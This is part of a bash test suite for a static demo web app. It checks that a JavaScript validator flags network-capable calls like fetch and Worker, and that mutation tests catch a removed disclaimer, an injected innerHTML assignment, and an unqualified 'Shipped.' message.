assert_clean_valid_snippet "async function-declaration close regex fetch" 'async function f() {} /fetch(x)/.test(text);'
assert_clean_valid_snippet "class-declaration close regex fetch" 'class C {} /fetch(x)/.test(text);'

# Codex tokenizer round-4 finding 3: grouping around a call or constructor
# target is semantically transparent; helper-call results stay opaque.
assert_forbidden_valid_snippet "grouped fetch call" '(fetch)("x");'
assert_forbidden_valid_snippet "double-grouped fetch call" '((fetch))("x");'
assert_forbidden_valid_snippet "grouped window.fetch call" '(window.fetch)("x");'
assert_forbidden_valid_snippet "grouped computed window.fetch call" '(window["fetch"])("x");'
assert_forbidden_valid_snippet "grouped optional fetch call" '(fetch)?.("x");'
assert_forbidden_valid_snippet "grouped new Worker constructor identity" 'new (Worker)("worker.js");'
assert_forbidden_valid_snippet "grouped computed new globalThis.Worker" 'new (globalThis["Worker"])("worker.js");'
assert_clean_valid_snippet "fetch identifier read stays clean" 'const f = fetch;'
assert_clean_valid_snippet "helper call with fetch argument then call stays opaque" 'adapter(fetch)("local");'
assert_clean_valid_snippet "grouped helper call with fetch argument then call stays opaque" '(adapter(fetch))("local");'
assert_clean_valid_snippet "grouped computed fetch read without call stays clean" '(obj["fetch"]);'
assert_clean_valid_snippet "grouped new WorkerFactory stays distinct" 'new (WorkerFactory)("local");'

if snippet_is_valid_js '{a:{b:1}} / window.open("x") / 2'; then
  bad "syntax validator accepted invalid statement-position nested-object division"
else
  ok "syntax validator rejects invalid statement-position nested-object division"
fi

# E — removed simulation disclaimer.
MUTANT_HTML_NODISCLAIMER="$TMP_DIR/index.mutant-nodisclaimer.html"
grep -vF 'no GitHub connection' "$INDEX_HTML" > "$MUTANT_HTML_NODISCLAIMER"
if grep -qF 'no GitHub connection' "$INDEX_HTML" && ! grep -qF 'no GitHub connection' "$MUTANT_HTML_NODISCLAIMER"; then
  ok "mutation witness (removed disclaimer): stripping the boundary banner is detected; the real index.html still has it"
else
  bad "mutation witness (removed disclaimer) did not discriminate real file from mutant"
fi

# F — innerHTML.
MUTANT_JS_INNERHTML="$TMP_DIR/app.mutant-innerhtml.js"
cp "$APP_JS" "$MUTANT_JS_INNERHTML"
printf '\ndocument.getElementById("x").innerHTML = "<b>y</b>";\n' >> "$MUTANT_JS_INNERHTML"
if check_forbidden_js "$APP_JS" && ! check_forbidden_js "$MUTANT_JS_INNERHTML"; then
  ok "mutation witness (innerHTML): an injected innerHTML assignment is detected; the real app.js stays clean"
else
  bad "mutation witness (innerHTML) did not discriminate real file from mutant"
fi

# G — unqualified shipped result.
MUTANT_JS_SHIPPED="$TMP_DIR/app.mutant-shipped.js"
sed "s/Demo complete\\. No code was changed or deployed\\./Shipped./" "$APP_JS" > "$MUTANT_JS_SHIPPED"
REAL_HAS_EXACT=$(grep -cF "'Demo complete. No code was changed or deployed.'" "$APP_JS")
MUTANT_HAS_EXACT=$(grep -cF "'Demo complete. No code was changed or deployed.'" "$MUTANT_JS_SHIPPED")
MUTANT_HAS_SHIPPED=$(grep -cE '\bShipped\b' "$MUTANT_JS_SHIPPED")
if [[ "$REAL_HAS_EXACT" -ge 1 && "$MUTANT_HAS_EXACT" -eq 0 && "$MUTANT_HAS_SHIPPED" -ge 1 ]]; then
  ok "mutation witness (unqualified shipped result): a swapped-in 'Shipped.' result is detected on both counts"
else
  bad "mutation witness (unqualified shipped result) did not discriminate real file from mutant"
fi

# =============================================================================
# Section 6 — syntax sanity (bash -n / node --check), matching the rest of
# the suite's own toolchain expectations.
# =============================================================================
echo
echo "syntax sanity"

bash -n "$SCRIPT_DIR/owner-journey.test.sh" && ok "this test script parses under bash -n" || bad "this test script fails bash -n"
node --check "$APP_JS" >/dev/null 2>&1 && ok "app.js parses under node --check" || bad "app.js fails node --check"

echo
echo "owner-journey.test.sh: $PASS passed, $FAIL failed"
[[ "$FAIL" -eq 0 ]]
